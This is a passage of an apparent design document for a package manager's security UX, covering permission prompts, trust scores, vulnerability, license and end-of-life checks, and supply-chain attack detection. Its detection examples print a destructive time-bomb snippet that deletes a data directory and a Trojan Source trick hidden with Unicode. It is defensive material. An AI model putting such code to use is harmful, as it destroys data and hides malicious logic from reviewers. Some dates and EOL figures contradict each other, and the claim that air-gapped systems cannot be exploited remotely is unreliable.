🚩 DANGEROUS permission requested:
  ├─> spawn (process spawning)
  └─> Reason: Unknown
  
Web servers should NOT spawn processes (security risk).
This is HIGHLY SUSPICIOUS.
Allow? (y/N) n
  ❌ Denied. Build will fail if required.
```

**Key insights:**
- Bundle common patterns (reduce prompt count)
- Highlight unusual requests (increase attention)
- Flag dangerous requests (prevent mistakes)

---

## Improved Error Messages

### Bad Error Message

```
Error: Capability violation
  Package: http-client
  Required: net_egress:api.github.com
  Allowed: net_egress:api.stripe.com
  Code: WJ-SEC-01-003
```

**Problems:**
- No explanation of WHY this matters
- No suggestion on HOW to fix
- Technical jargon (capability violation)

### Good Error Message

```
🔴 Security Error: Network access not allowed

Package: http-client@2.0.0
Location: src/github.rs:45

Attempted: Connect to api.github.com
Allowed: api.stripe.com (from manifest)

Why this matters:
  This package tried to connect to GitHub's API, but your
  application's security manifest only allows Stripe API access.
  
  This could be:
  1. Bug: Package using wrong API endpoint
  2. Attack: Malicious code trying to exfiltrate data
  3. Mistake: Forgot to add github.com to manifest

How to fix:
  Option 1: If GitHub access is legitimate, add to manifest
    wj allow http-client net_egress:api.github.com --audit "GitHub API integration"
  
  Option 2: If this is unexpected, investigate
    wj show http-client@2.0.0 --source
    wj diff http-client@1.9.0 @2.0.0  # See what changed
  
  Option 3: Block this version
    wj deny http-client@2.0.0 --keep 1.9.0

Need help? wj copilot "Why is http-client blocked?"
```

**Improvements:**
- Explains WHY (context)
- Provides actionable HOW (3 options)
- Links to helpful tools (copilot, show, diff)
- Friendly tone (collaborative, not authoritarian)

---

## Capability Tracing for Debugging

### The Scenario

**Build fails, user doesn't understand why:**

```bash
wj build

Error: Capability violation
  Package: http-client
  Function: request()
  Capability: net_egress:api.github.com

# User: "Why? How did api.github.com get called?"
```

### Solution: Capability Trace

```bash
wj trace net_egress:api.github.com

Tracing capability: net_egress:api.github.com

Call chain:
  main() [src/main.rs:10]
  └─> sync_repos() [src/sync.rs:45]
      └─> github::fetch_repos() [deps/github-client/src/lib.rs:120]
          └─> http_client::request("https://api.github.com/repos") 
              [deps/http-client/src/client.rs:89]

This capability was used in:
  Context: Syncing GitHub repositories
  Added in: commit abc123 (2026-03-20)
  Author: alice@example.com
  PR: #123 "Add GitHub sync feature"

To fix:
  Add to manifest: wj allow http-client net_egress:api.github.com --audit "GitHub sync"
  Or remove: git revert abc123
  Or refactor: Use read-only GitHub API (no token required)
```

**Benefits:**
- Clear understanding of WHY capability is needed
- WHERE it's used (full call chain)
- WHEN it was added (git history)
- HOW to fix (actionable steps)

---

## Trust Score Transparency (Build User Confidence)

### The Problem: Black Box Decisions Erode Trust

**Bad UX:**

```
wj add some-package

❌ Denied (suspicious behavior)

# User: "WHY?! What did it do? How do I know you're not wrong?"
```

**User loses trust in system, adds `--trust-override` to everything.**

### Solution: Transparent Trust Scores

**Good UX:**

```
wj add some-package

Security review: some-package@1.0.0

Trust Score: 6.2/10 (Below threshold: 7.0)

Breakdown:
  ✅ Code analysis: 8.5/10
     └─> Public API matches claimed purpose (JSON parser)
     └─> No hidden network calls
     
  ⚠️  Community trust: 4.5/10
     └─> Package published 3 days ago (very new)
     └─> Only 12 downloads (low adoption)
     └─> Maintainer has 1 package (unproven)
     
  ✅ Behavioral profile: 9.0/10
     └─> Matches "parser" profile closely
     └─> No anomalous patterns
     
  ⚠️  Anomaly score: 5.0/10
     └─> Uses unusual dependencies (rare combination)

Recommendation: WAIT
  └─> Give it 2-4 weeks, let community vet it
  └─> Check again: wj add some-package (will re-check)

Alternatives (well-established):
  └─> serde_json (trust: 9.8/10, 50M downloads)
  └─> json (trust: 9.1/10, 12M downloads)

Override (use at your own risk):
  wj add some-package --trust-override --audit "Reviewed source, looks OK"
```

**Key: User understands WHY it's flagged and can make informed decision.**

---

## Community Feedback Loop

### The Problem: AI Can't Catch Everything

**Some false positives are unavoidable. Let users help.**

### Solution: Quick Feedback Mechanism

```bash
wj add legitimate-package

⚠️  Flagged as suspicious (trust: 6.8/10)

# User reviews code, it's legitimate

wj feedback legitimate-package --legitimate --reason "Reviewed source, false positive"

✅ Feedback submitted to Windjammer Security Team
✅ This helps improve our detection (thank you!)
✅ Allowing legitimate-package for your project

Your contribution will help other developers ❤️
```

**Benefit: Crowdsourced ground truth improves detection over time.**

### False Positive Reporting

```bash
# Mark as false positive
wj report-false-positive suspicious-lib

Reporting false positive: suspicious-lib@1.0.0

Why was it flagged?
  └─> Anomaly: HTTP client writing to ./cache/*
  
Why is this legitimate?
> HTTP clients cache responses to improve performance

✅ Reported
✅ This will help reduce future false positives
✅ Allowed for your project

Thank you for improving Windjammer! 🙏
```

---

## Graduated Trust: New Packages Start Restricted

### The Problem: New Packages Are Highest Risk

**Historical data shows:**
- 90% of malicious packages are <30 days old
- 95% have <1000 downloads
- 99% are from new/unknown maintainers

### Solution: Automatic Trust Graduation

**Day 0-7 (New Package):**

```
Trust level: UNTRUSTED (default: deny)
Reason: Too new to vet

Allowed uses:
  - Dev dependencies (testing, not production)
  - Sandboxed environments only
  
To use in production: Wait 1 week for community vetting
```

**Day 8-30 (Emerging Package):**

```
Trust level: LOW (allow with extra scrutiny)
Reason: Some community validation

Required:
  - Must match capability profile
  - Anomaly score < 3.0
  - At least 100 downloads
```

**Day 31-90 (Established Package):**

```
Trust level: MEDIUM (normal rules apply)
Reason: Community-vetted

Standard capability analysis applies
```

**Day 91+ (Mature Package):**

```
Trust level: HIGH (fast-track approval)
Reason: Well-established

If matches common patterns → Auto-approve
```

**User Experience:**

```bash
# Day 2: Try to add brand new package
wj add super-new-lib

⚠️  Package is very new (published 2 days ago)

Windjammer recommends waiting 1 week for community vetting.
New packages are highest risk for supply chain attacks.

Options:
  1. Wait 5 more days (check back: 2026-03-26)
  2. Use alternative (wj search super-new-lib:alternatives)
  3. Override (dev only): wj add super-new-lib --dev-only
  4. Override (production): wj add super-new-lib --trust-override

Recommendation: Wait or use established alternative

# Day 30: Check again
wj add super-new-lib

Security review: super-new-lib@1.0.0

Trust Score: 7.8/10 ✅
  └─> Package now has 30 days history
  └─> 1,250 downloads (community adoption)
  └─> No reports of issues

✅ Added (trust level: MEDIUM)
```

**Philosophy: Time is a security feature. Let community vet new packages.**

---

## Integrated Vulnerability Scanning (Trivy, Grype, Snyk)

### The Problem: Vulnerability Scanning Is Manual

**Current workflow:**
```bash
# Manual scanning (developers skip)
trivy fs .
grype dir:.
snyk test
```

**Problems:**
- Separate tool, extra command
- Developers forget to run it
- No enforcement (warnings ignored)

### Windjammer Solution: Automatic Vulnerability Scanning

**Zero-ceremony vulnerability checking:**

```bash
wj add some-package

Adding some-package@1.0.0...

🔍 Security scan (automatic)...
  ├─> Trivy: Checking vulnerabilities...
  ├─> Grype: Checking CVEs...
  └─> Windjammer Security: Checking capability profiles...

⚠️  Vulnerability found

Package: some-package@1.0.0
CVE: CVE-2024-1234 (HIGH)
Description: Buffer overflow in parse_json()
Fixed in: 1.0.1

Action required:
  1. Upgrade: wj add some-package@1.0.1
  2. Review: wj show CVE-2024-1234
  3. Override (not recommended): wj add some-package@1.0.0 --ignore-vuln CVE-2024-1234

Build blocked (HIGH severity vulnerability)
```

**Configuration:**

```toml
# wj.toml
[security.vulnerability_scanning]
# Enable automatic scanning (default: true)
enabled = true

# Scanners to use (default: all available)
scanners = ["trivy", "grype", "windjammer"]

# Severity threshold (default: "medium")
# Block builds for vulnerabilities at or above this level
block_threshold = "medium"  # low, medium, high, critical

# Allow specific CVEs (with justification)
allowed_cves = [
    { id = "CVE-2024-1234", reason = "False positive for our use case", expires = "2026-06-01" }
]
```

**Automatic daily scans:**

```bash
# Run security audit (checks all dependencies)
wj security audit

Security audit: my-app

Scanning dependencies: 23
  ├─> Trivy: 23/23 ✅
  ├─> Grype: 23/23 ✅
  └─> Windjammer: 23/23 ✅

Vulnerabilities found: 2

🔴 CRITICAL (1):
  some-package@1.0.0 (CVE-2024-9999)
  └─> Remote code execution
  └─> Fix: Upgrade to 1.0.2
  
🟡 MEDIUM (1):
  other-lib@2.0.0 (CVE-2024-8888)
  └─> Denial of service
  └─> Fix: Upgrade to 2.0.1

Action: wj update --fix-vulns
```

**CI Integration:**

```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  schedule:
    - cron: '0 0 * * *'  # Daily
  pull_request:

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: windjammer-lang/setup-wj@v1
      - run: wj security audit --ci
        # Fails if vulnerabilities found
```

---

## License Compliance Automation

### The Problem: License Compliance Is Manual

**Questions legal teams ask:**
- What licenses are in our dependencies?
- Are there GPL licenses (copyleft)?
- Do we have attribution files?

**Current state:** Manual review, spreadsheets.

### Windjammer Solution: Automatic License Tracking

**Zero-ceremony license compliance:**

```bash
wj build --release

Building my-app...

📜 License compliance check...

Licenses found: 3 types
  ✅ MIT: 15 packages (65%)
  ✅ Apache-2.0: 8 packages (35%)
  ⚠️  GPL-3.0: 1 package (4%)

⚠️  License policy violation

Package: some-gpl-lib@1.0.0
License: GPL-3.0 (copyleft)
Policy: GPL licenses require legal review

Options:
  1. Find alternative: wj search some-gpl-lib:alternatives --exclude-license GPL
  2. Request approval: wj license request some-gpl-lib@1.0.0 --reason "..."
  3. Update policy: Edit wj.toml [security.licenses]

Build blocked (license policy violation)
```

**License policy configuration:**

```toml
# wj.toml
[security.licenses]
# Allowed licenses (default: permissive licenses)
allowed = ["MIT", "Apache-2.0", "BSD-3-Clause", "ISC"]

# Licenses requiring review
requires_review = ["GPL-3.0", "AGPL-3.0", "LGPL-3.0"]

# Forbidden licenses
forbidden = ["SSPL", "Proprietary"]

# Generate attribution file (default: true)
generate_attribution = true
# Output: target/release/ATTRIBUTION.txt
```

**Attribution file (auto-generated):**

```text
# ATTRIBUTION

This software includes the following third-party packages:

## serde (MIT)
Copyright (c) 2014 The Rust Project Developers
https://github.com/serde-rs/serde

Permission is hereby granted, free of charge, to any person obtaining a copy...

## tokio (MIT)
Copyright (c) 2020 Tokio Contributors
https://github.com/tokio-rs/tokio

Permission is hereby granted, free of charge, to any person obtaining a copy...

... (all dependencies listed)
```

**License audit report:**

```bash
wj licenses report

License Compliance Report

Total packages: 23

License breakdown:
  MIT: 15 (65.2%)
  Apache-2.0: 8 (34.8%)

Compliance status: ✅ PASS
  ├─> All licenses approved
  ├─> Attribution file generated
  └─> No copyleft licenses

Export options:
  JSON: wj licenses report --format json > licenses.json
  CSV: wj licenses report --format csv > licenses.csv
  SPDX: wj licenses report --format spdx > licenses.spdx
```

---

## Dependency Graph Visualization

### The Problem: Can't See Dependency Relationships

**Questions:**
- Why is package X included?
- What depends on vulnerable package Y?
- Can I remove unused dependencies?

### Windjammer Solution: Interactive Dependency Graph

**Visualize dependencies:**

```bash
wj deps graph

Generating dependency graph...

my-app@1.0.0
├─> serde@1.0.0
│   ├─> serde_derive@1.0.0
│   └─> serde_json@1.0.0
├─> tokio@1.0.0
│   ├─> tokio-macros@1.0.0
│   ├─> mio@0.8.0
│   └─> socket2@0.5.0
└─> clap@4.0.0
    ├─> clap_derive@4.0.0
    └─> clap_lex@0.3.0

Direct dependencies: 3
Transitive dependencies: 8
Total: 11

Export: wj deps graph --format svg > deps.svg
Interactive: wj deps graph --web (opens browser)
```

**Why is package included:**

```bash
wj deps why some-package

Why is some-package@1.0.0 included?

my-app@1.0.0
└─> tokio@1.0.0
    └─> mio@0.8.0
        └─> some-package@1.0.0

Reason: Transitive dependency (3 levels deep)
Used by: tokio (async I/O)
Can be removed: No (required by tokio)
```

**Find reverse dependencies:**

```bash
wj deps reverse serde

Packages depending on serde@1.0.0:

Direct dependents: 2
  ├─> my-app@1.0.0 (uses serde directly)
  └─> serde_json@1.0.0 (derives from serde)

Transitive dependents: 5
  └─> (packages that depend on serde_json)

Impact if removed: 7 packages affected
```

**Unused dependency detection:**

```bash
wj deps unused

Analyzing dependency usage...

Unused dependencies: 2

⚠️  http-client@2.0.0
  └─> Added but never imported
  └─> Remove: wj remove http-client

⚠️  old-parser@1.0.0
  └─> Was used, no longer imported
  └─> Remove: wj remove old-parser

Space savings: 2.4 MB
Build time savings: ~3 seconds
```

---

## Supply Chain Attack Detection (Advanced Heuristics)

### The Problem: Sophisticated Attacks Bypass Simple Checks

**Modern supply chain attacks:**
- **Typosquatting**: `reqeust` instead of `request`
- **Dependency confusion**: Private name, public malicious version
- **Maintainer compromise**: Legitimate package turned malicious
- **Trojan source**: Hidden Unicode characters
- **Time bombs**: Malicious code activates after delay

### Windjammer Solution: Multi-Layered Detection

**Typosquatting detection:**

```bash
wj add reqeust

⚠️  Potential typosquatting detected

You typed: reqeust
Did you mean: request (12M downloads, trusted)?

Similarity: 91% (one character difference)

reqeust@1.0.0:
  ├─> 3 downloads (suspicious!)
  ├─> Published 2 days ago (new)
  ├─> Maintainer: unknown-user (0 reputation)
  └─> Risk: ⚠️  HIGH (likely typosquatting)

request@2.0.0:
  ├─> 12M downloads
  ├─> Published 5 years ago
  ├─> Maintainer: trusted-org
  └─> Risk: ✅ LOW (well-established)

Recommendation: Use 'request' instead

Proceed with 'reqeust'? (y/N) n
```

**Dependency confusion protection:**

```bash
wj add internal-lib

⚠️  Dependency confusion warning

Package name: internal-lib
Found in: 2 registries

Registry 1: registry.windjammer.org (public)
  └─> internal-lib@1.0.0 (published yesterday)
  └─> Maintainer: unknown-user
  └─> Risk: 🔴 HIGH (suspicious timing)

Registry 2: internal.mycompany.com (private)
  └─> internal-lib@2.0.0 (published 6 months ago)
  └─> Maintainer: mycompany-team
  └─> Risk: ✅ LOW (internal package)

Which registry to use?
  1. Private (internal.mycompany.com) ← RECOMMENDED
  2. Public (registry.windjammer.org)
  3. Cancel

Choice: 1

✅ Using private registry (protected against dependency confusion)
```

**Maintainer compromise detection:**

```bash
wj add trusted-lib

Analyzing trusted-lib@3.0.0...

⚠️  Maintainer change detected

trusted-lib history:
  v1.0.0 - v2.9.0: original-maintainer (2 years, 1000 commits)
  v3.0.0: new-maintainer (1 commit, added 3 days ago)

Suspicious activity:
  ├─> New maintainer with no history
  ├─> Version 3.0.0 adds network capabilities (unusual)
  ├─> 10x code size increase (suspicious)
  └─> Obfuscated code detected (red flag)

Risk: 🔴 CRITICAL (possible maintainer compromise)

Recommendation:
  1. Use v2.9.0 (last version by original maintainer)
  2. Wait for community vetting (2-4 weeks)
  3. Contact original maintainer: original-maintainer@example.com

Automatically downgrading to: trusted-lib@2.9.0
```

**Trojan source detection:**

```bash
wj build

Analyzing source code...

⚠️  Trojan source detected

File: src/auth.rs:42
Issue: Hidden Unicode character (U+202E - RIGHT-TO-LEFT OVERRIDE)

This character reverses text direction, hiding malicious code:

Visible code:
  if user.is_admin() { /* allow access */ }

Actual code (with Unicode revealed):
  if user.is_admin() { /* <U+202E>kcatta wolla// */ revoke_all_access() }

This is a SECURITY VULNERABILITY (CVE-2021-42574)

Action required:
  1. Review: wj show src/auth.rs:42 --reveal-unicode
  2. Fix: Remove hidden characters
  3. Reject: This code appears malicious

Build blocked (trojan source detected)
```

**Time bomb detection:**

```bash
wj add time-bomb-lib

Analyzing time-bomb-lib@1.0.0...

⚠️  Time-based behavior detected

Code analysis:
  ├─> Checks current date (suspicious for library)
  ├─> Deletes files after 2026-04-01 (🚨 TIME BOMB!)
  ├─> Network call activated after 30 days (suspicious)
  
Suspicious code:
  ```
  if Date::now() > Date::from_str("2026-04-01") {
      fs::remove_dir_all("/important/data")  // 🚨 MALICIOUS!
  }
  ```

Risk: 🔴 CRITICAL (time bomb detected)

This is CLEARLY MALICIOUS code.

Package rejected.
Report: wj report time-bomb-lib@1.0.0 --malware
```

---

## Integration with Security Databases (NVD, OSV, GitHub)

### The Problem: Vulnerability Data Is Scattered

**Vulnerability databases:**
- NVD (National Vulnerability Database)
- OSV (Open Source Vulnerabilities)
- GitHub Security Advisories
- Rust Security Advisory Database
- Snyk Vulnerability Database

### Windjammer Solution: Unified Vulnerability Database

**Automatic database integration:**

```bash
wj security update-db

Updating vulnerability databases...

✅ NVD: Updated (142,000 CVEs)
✅ OSV: Updated (45,000 vulnerabilities)
✅ GitHub Advisories: Updated (12,000 advisories)
✅ RustSec: Updated (420 advisories)
✅ Snyk: Updated (via API)

Last updated: 2026-03-21T16:00:00Z
Next update: Automatic (daily)
```

**Cross-database vulnerability checking:**

```bash
wj security check some-package@1.0.0

Checking some-package@1.0.0 across 5 databases...

Vulnerabilities found: 3

CVE-2024-1234 (CRITICAL) - Found in:
  ├─> NVD: 9.8/10 (critical)
  ├─> OSV: Critical
  ├─> GitHub: Critical
  └─> Consensus: 🔴 CRITICAL

CVE-2024-5678 (HIGH) - Found in:
  ├─> NVD: 7.5/10 (high)
  ├─> OSV: High
  └─> Consensus: 🟠 HIGH

WJ-2024-0001 (MEDIUM) - Found in:
  └─> Windjammer Database: Medium
      (Capability violation, not in other DBs yet)

Recommendation: Upgrade to 1.0.2 (all vulnerabilities fixed)
```

---

## End-of-Life (EOL) and Abandoned Package Detection

### The Problem: Unmaintained Dependencies Are Security Risks

**Risks of abandoned packages:**
- No security patches for vulnerabilities
- No bug fixes
- No compatibility updates
- Eventual incompatibility
- Supply chain risk (maintainer account compromise)

**Current state:** Developers don't know packages are abandoned until problems arise.

### Windjammer Solution: Automatic EOL Tracking

**Zero-ceremony EOL detection:**

```bash
wj add some-package

Adding some-package@1.0.0...

⚠️  End-of-Life warning

Package: some-package@1.0.0
Status: ⚠️  UNMAINTAINED

Indicators:
  ├─> Last update: 847 days ago (2024-06-01)
  ├─> Last commit: 912 days ago
  ├─> Open issues: 47 (23 security-related)
  ├─> Unpatched CVEs: 3 (2 high, 1 medium)
  └─> Maintainer: No activity in 2+ years

Risk: 🔴 HIGH (abandoned package)

Alternatives (actively maintained):
  1. better-package@2.0.0
     └─> Last update: 3 days ago
     └─> Active maintainer (50+ commits/year)
     └─> No known vulnerabilities
     └─> 10x more downloads
  
  2. modern-lib@1.5.0
     └─> Last update: 1 week ago
     └─> Active community (200+ contributors)
     └─> Compatible API

Recommendation: Use better-package@2.0.0 instead

Proceed with abandoned package? (y/N) n
```

**Configuration:**

```toml
# wj.toml
[security.eol]
# Enable EOL detection (default: true)
enabled = true

# Days since last update to consider "stale" (default: 365)
stale_threshold_days = 365

# Days since last update to consider "abandoned" (default: 730)
abandoned_threshold_days = 730

# Block builds with abandoned packages (default: warn)
abandoned_action = "warn"  # or "block" or "allow"

# Track EOL dates from official sources
track_official_eol = true

# Sources: endoflife.date, libraries.io, deps.dev
```

**Automatic EOL checks:**

```bash
wj security audit

Security audit: my-app

Checking dependencies: 23

EOL Status:
  ✅ Active: 18 packages (78%)
  ⚠️  Stale: 3 packages (13%)
  🔴 Abandoned: 2 packages (9%)

🔴 ABANDONED (2):

  old-parser@1.0.0
    ├─> Last update: 1,247 days ago
    ├─> Unpatched CVEs: 2 (HIGH)
    ├─> Alternative: modern-parser@2.0.0
    └─> Action: wj replace old-parser modern-parser

  legacy-http@0.9.0
    ├─> Last update: 982 days ago
    ├─> Official EOL: 2024-12-31 (reached)
    ├─> Alternative: reqwest@1.0.0 (standard)
    └─> Action: wj replace legacy-http reqwest

⚠️  STALE (3):

  some-lib@2.0.0
    ├─> Last update: 456 days ago
    ├─> Still receiving security patches
    ├─> Monitor: Check for updates quarterly
    └─> Status: LOW RISK (watch)

Action: wj security fix-eol
```

**Official EOL date tracking:**

```bash
wj security eol-info python

Python EOL dates (from endoflife.date):

Version    | Release    | EOL Date    | Status
-----------|------------|-------------|--------
3.12       | 2023-10-02 | 2028-10     | ✅ Active
3.11       | 2022-10-24 | 2027-10     | ✅ Active
3.10       | 2021-10-04 | 2026-10     | ✅ Active
3.9        | 2020-10-05 | 2025-10     | ⚠️  EOL soon (7 months)
3.8        | 2019-10-14 | 2024-10     | 🔴 EOL reached
3.7        | 2018-06-27 | 2023-06     | 🔴 EOL reached

Your project uses: Python 3.9 ⚠️  (EOL in 7 months)

Recommendation: Upgrade to Python 3.11 or 3.12
Plan migration: wj migrate python 3.12
```

**Dependency health scoring:**

```bash
wj deps health

Dependency Health Report

Overall health: 8.2/10 ✅

Health breakdown:

🟢 Excellent (9.0-10.0): 12 packages (52%)
  └─> Active development, no issues, well-maintained

🟡 Good (7.0-8.9): 6 packages (26%)
  └─> Stable, occasional updates, minor issues

🟠 Fair (5.0-6.9): 3 packages (13%)
  └─> Infrequent updates, some open issues
  └─> Action: Monitor for alternatives

🔴 Poor (0-4.9): 2 packages (9%)
  └─> Abandoned or near-EOL
  └─> Action: Replace immediately

Health factors:
  ✅ Update frequency: 8.5/10
  ✅ Security patches: 9.2/10
  ⚠️  Maintenance activity: 7.8/10 (3 stale)
  ✅ Community engagement: 8.9/10
  ⚠️  EOL status: 7.5/10 (2 abandoned)

Recommendations:
  1. Replace 2 abandoned packages
  2. Monitor 3 stale packages
  3. All others: healthy ✅
```

**Maintenance activity tracking:**

```bash
wj deps activity some-package

Maintenance Activity: some-package

Recent activity:
  Last commit: 456 days ago (2024-10-15)
  Last release: 523 days ago (2024-08-10)
  Last security patch: 701 days ago (2024-02-15)

Commit frequency:
  Last 30 days: 0 commits
  Last 90 days: 0 commits
  Last 365 days: 2 commits (very low)
  
Issues:
  Open: 47 issues
  Closed (last year): 3 issues
  Response time: >30 days (slow)

Pull requests:
  Open: 12 PRs (oldest: 389 days)
  Merged (last year): 1 PR
  
Maintainer activity:
  Last seen: 489 days ago
  Other projects: 0 active (1 total)
  Response rate: 8% (very low)

Community:
  Contributors: 5 (all inactive)
  Forks: 23 (3 more active than upstream)
  Stars: 1,247 (declining)

Status: 🔴 ABANDONED
  └─> No meaningful activity in 12+ months
  └─> Maintainer appears to have moved on
  └─> Consider forks or alternatives

Active forks:
  1. user/some-package (fork)
     └─> Last update: 12 days ago
     └─> 89 commits ahead of upstream
     └─> Maintained by active developer
     └─> Use: wj add user/some-package
     
  2. org/some-package-maintained (fork)
     └─> Last update: 5 days ago
     └─> 124 commits ahead
     └─> Security fixes backported
     └─> Use: wj add org/some-package-maintained
```

**Auto-replacement suggestions:**

```bash
wj security fix-eol --auto-suggest

Fixing EOL/abandoned dependencies...

Found 2 abandoned packages with automatic replacements:

1. old-parser@1.0.0 → modern-parser@2.0.0
   ├─> API compatible: 95%
   ├─> Performance: 3x faster
   ├─> Migration effort: Low (2 breaking changes)
   └─> Migration guide: wj migrate old-parser modern-parser

2. legacy-http@0.9.0 → reqwest@1.0.0
   ├─> API compatible: 80%
   ├─> Industry standard (12M downloads)
   ├─> Migration effort: Medium (API redesign)
   └─> Migration guide: wj migrate legacy-http reqwest

Apply all replacements? (Y/n) y

Replacing old-parser with modern-parser...
  ✅ Updated wj.toml
  ✅ Updated imports (3 files)
  ✅ Fixed breaking changes (2 locations)
  ✅ Tests passing ✅

Replacing legacy-http with reqwest...
  ✅ Updated wj.toml
  ⚠️  Manual migration needed (see migration-guide.md)
  └─> API redesign requires code changes

Migration summary:
  ├─> 1 automatic (old-parser)
  ├─> 1 manual (legacy-http)
  └─> Estimated time: 30 minutes

Next steps:
  1. Review changes: git diff
  2. Complete manual migration: See migration-guide.md
  3. Test: wj test
  4. Commit: git commit -m "Replace EOL dependencies"
```

**Integration with EOL databases:**

- **endoflife.date**: Official EOL dates for languages, frameworks, OS
- **libraries.io**: Package activity and health metrics
- **deps.dev**: Google's dependency health data
- **GitHub API**: Commit activity, issue response times
- **npm/crates.io/PyPI**: Download trends, publication dates

**Proactive monitoring:**

```yaml
# .github/workflows/eol-check.yml
name: EOL Check

on:
  schedule:
    - cron: '0 0 * * 1'  # Weekly

jobs:
  eol-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: windjammer-lang/setup-wj@v1
      - run: wj security audit --eol-only
      - run: |
          if wj deps health | grep "Poor"; then
            echo "::error::Abandoned dependencies found"
            exit 1
          fi
```

**Benefits:**
- Proactive security (catch abandoned packages early)
- Reduced maintenance burden (avoid unmaintained code)
- Better long-term stability
- Automatic migration suggestions
- Zero-ceremony monitoring

---

### Air-Gapped EOL Tracking (Offline Mode)

#### The Problem: Air-Gapped Systems Can't Access External Databases

**Air-gapped environments:**
- No internet access (by design)
- Can't query: NVD, OSV, GitHub, endoflife.date, libraries.io
- Still need dependency hygiene
- But inherently MORE secure (no remote attacks)

**Design goals:**
1. Work entirely offline (use only local data)
2. Non-noisy (air-gapped = safer, fewer warnings)
3. Focus on staleness, not vulnerabilities
4. Actionable insights without external lookups

#### Solution: Lock File Timestamp Analysis

**Use `.wj-capabilities.lock` timestamps:**

```toml
# .wj-capabilities.lock (tracks when dependencies were approved)
lock_version = 1

[dependencies.some-package]
version = "1.0.0"
first_seen = "2024-01-15T10:30:00Z"     # When first added
last_updated = "2024-01-15T10:30:00Z"   # When last changed
last_reviewed = "2024-01-15T10:30:00Z"  # When last manually reviewed
allowed = ["logic_only"]
hash = "sha256:abc123..."

[dependencies.old-package]
version = "2.0.0"
first_seen = "2022-03-20T14:00:00Z"     # 2+ years ago
last_updated = "2022-03-20T14:00:00Z"   # Never updated
last_reviewed = "2022-03-20T14:00:00Z"  # Never re-reviewed
allowed = ["fs_read"]
hash = "sha256:def456..."
```

**Offline audit (simplified):**

```bash
wj security audit --offline

Offline security audit (air-gapped mode)

Using local data only (no external databases)

Dependency staleness analysis:

✅ Recently reviewed (<1 year): 18 packages (78%)
⚠️  Due for review (1-2 years): 3 packages (13%)
📋 Overdue for review (>2 years): 2 packages (9%)

📋 REVIEW RECOMMENDED (2 packages):

  old-package@2.0.0
    ├─> First added: 2022-03-20 (4 years ago)
    ├─> Last updated: Never (same version)
    ├─> Last reviewed: 2022-03-20 (4 years ago)
    └─> Action: Review this dependency
        └─> Still needed? wj deps why old-package
        └─> Consider updating (when next online)
        └─> Mark as reviewed: wj deps review old-package

  legacy-lib@1.5.0
    ├─> First added: 2023-01-10 (3 years ago)
    ├─> Last updated: Never
    ├─> Last reviewed: 2023-01-10 (3 years ago)
    └─> Action: Review this dependency

⚠️  STALE (1-2 years) (3 packages):
  └─> Consider reviewing when convenient

Note: Air-gapped mode (offline)
  - No vulnerability lookup (requires network)
  - No EOL date checking (requires network)
  - Staleness based on local timestamps only
  - Air-gapped systems are inherently more secure
  
Next review recommended: 2027-03-21 (1 year from now)
```

**Configuration (air-gapped friendly):**

```toml
# wj.toml
[security.eol]
# Detect network availability automatically
mode = "auto"  # online | offline | auto

# For offline mode: Less aggressive thresholds
offline_review_threshold_days = 730   # 2 years (vs 365 for online)
offline_abandoned_threshold_days = 1460  # 4 years (vs 730 for online)

# Offline mode action (default: "info" for air-gapped)
offline_action = "info"  # info | warn | block

# Reasoning: Air-gapped systems are inherently safer
# No remote exploits possible, so stale packages less risky
```

**Automatic mode detection:**

```rust
fn detect_mode() -> AuditMode {
    // Try to reach registry
    if can_reach("https://registry.windjammer.org", timeout_ms: 1000) {
        AuditMode::Online
    } else {
        eprintln!("Note: Network unavailable, using offline mode");
        AuditMode::Offline
    }
}
```

**Offline vs Online behavior:**

| Feature | Online Mode | Offline Mode (Air-Gapped) |
|---------|-------------|---------------------------|
| **Vulnerability lookup** | ✅ Check NVD, OSV, etc. | ❌ Skip (no network) |
| **EOL date checking** | ✅ Check endoflife.date | ❌ Skip (no network) |
| **Maintainer activity** | ✅ Check GitHub API | ❌ Skip (no network) |
| **Staleness threshold** | 365 days | 730 days (2x lenient) |
| **Abandoned threshold** | 730 days | 1460 days (2x lenient) |
| **Action on stale** | ⚠️  Warn | ℹ️  Info only |
| **Action on abandoned** | 🔴 Block | ⚠️  Warn (not block) |
| **Alternatives suggested** | ✅ From registry | ❌ None (can't query) |
| **Trust score** | ✅ Full analysis | ⚠️  Local only |

**Offline audit output (non-noisy):**

```bash
wj security audit --offline

Offline audit: my-app (air-gapped mode)

Dependencies: 23
  ✅ All present in lock file
  ✅ Hashes verified
  ℹ️  2 dependencies not reviewed in 2+ years (normal for air-gapped)

Recommendations (when next online):
  1. Update vulnerability databases: wj security update-db
  2. Check for updates: wj outdated
  3. Review old dependencies: wj deps review-old

Current risk: ✅ LOW (air-gapped environment)

No action needed now.
```

**Key differences for air-gapped:**
- ℹ️  Info-level messages (not warnings)
- 2x longer thresholds (2 years, not 1 year)
- No blocking (just informational)
- Acknowledges air-gapped = safer
- Suggests actions "when next online"

**Manual review workflow:**

```bash
# Mark dependency as reviewed (resets timer)
wj deps review old-package

Reviewing old-package@2.0.0...

Questions:
  1. Is this package still needed? (Y/n) y
  2. Any known issues in your environment? (y/N) n
  3. Plan to update when next online? (y/N) n
     Reason: Stable, working, no need to change

✅ Marked as reviewed (timestamp: 2026-03-21)
✅ Next review: 2028-03-21 (2 years)

Updated .wj-capabilities.lock:
  [dependencies.old-package]
  last_reviewed = "2026-03-21T16:00:00Z"
  review_notes = "Stable, working, no need to change"
```

**Periodic review prompts (gentle):**

```bash
wj build

Building my-app...
✅ Build complete

ℹ️  Note: 2 dependencies are due for review (added 2+ years ago)

This is normal for air-gapped environments.
When convenient, run: wj deps review-old

(This message shown quarterly, not every build)
```

**Philosophy:**
- **Air-gapped = inherently safer** (no remote attacks)
- **Don't cry wolf** (noisy warnings ignored)
- **Focus on hygiene** (not panic)
- **Quarterly reminders** (not every build)
- **Respect offline constraints** (no unreachable suggestions)

**Bundled security database (offline support):**

```bash
# While online: Download security database for offline use
wj security download-db --offline-bundle

Downloading security databases for offline use...

✅ NVD: 142,000 CVEs (482 MB)
✅ OSV: 45,000 vulnerabilities (123 MB)
✅ GitHub Advisories: 12,000 advisories (34 MB)
✅ RustSec: 420 advisories (1.2 MB)

Total: 640 MB

Saving to: ~/.wj-security-db-offline/
  └─> Expires: 2026-06-21 (90 days)

# Now disconnect from network

# Later, in air-gapped environment:
wj security audit --use-offline-db

